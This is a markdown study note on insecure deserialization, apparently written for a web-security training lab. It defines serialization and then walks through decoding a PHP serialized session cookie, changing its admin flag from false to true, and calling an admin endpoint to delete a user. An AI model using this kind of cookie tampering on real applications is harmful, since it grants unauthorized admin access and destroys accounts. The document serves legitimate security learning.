# Insecure deserialization


- <details>
     <summary>What is serialization?</summary>

     ## What is serialization?
     
     
     **Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
     
     -   Write complex data to inter-process memory, a file, or a database
     -   Send complex data, for example, over a network, between different components of an application, or in an API call
     
     Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
     



     
</details>




































<details>
  <summary>Lab: Modifying serialized objects</summary>

1. login as `wiener`
2. intercept the request of `/my-account`

<img width="707" height="621" alt="image" src="https://github.com/user-attachments/assets/4277d372-f554-4646-8b6e-ea389fb9d546" />

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

3. send cookie to decoder found

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}%3d
```

4. now try to change **`b:0`** to **`b:1`** from false to true
 
<img width="1460" height="634" alt="image" src="https://github.com/user-attachments/assets/f1465f17-e624-4fa0-8456-fbb483a8a3c2" />

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}%3d
```

<img width="1102" height="428" alt="image" src="https://github.com/user-attachments/assets/b6e40c36-3938-4f69-89d6-0815ba9c3fd9" />

5. now visit admin panal and delete carlos

```
/admin/delete?username=carlos
```

<img width="1421" height="793" alt="image" src="https://github.com/user-attachments/assets/cef09826-e1ec-41af-af50-7804bb31a5a6" />


  
</details>
